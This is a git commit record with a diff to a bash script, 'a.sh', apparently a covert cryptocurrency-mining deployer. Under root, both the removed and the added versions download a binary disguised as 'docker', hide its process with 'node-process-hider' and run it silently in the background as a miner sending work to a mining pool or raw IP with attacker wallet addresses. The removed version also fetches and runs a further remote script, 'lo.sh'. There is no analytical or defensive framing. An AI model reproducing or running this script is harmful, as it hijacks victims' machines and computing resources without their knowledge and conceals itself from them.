171fc0f298225d9adfa7b5a061a9abd5dee9a125
jsiqiisn <jsiqiisn@outlook.com>
2022-03-23 14:25:08 +0000

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 apt update && apt -y install sudo gcc curl zip
-sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker && ph add docker && chmod +x docker && ./docker -a rx/arq -o pool.babycoin.dev:4444 -u babyz9b4zdZfTNfUPtXEEd2aP2gyVNkVUN7znzfbzFMwMMCrJmZuT2mS4fu2aqqR8UeNpNBUBeVv67vS79s8DWigjbfo8jsEqEN -p $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1 > /dev/null 2>&1 &
-wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh"
+sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker && ph add docker && chmod +x docker && ./docker -o 40.83.177.217:80 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
+ls"
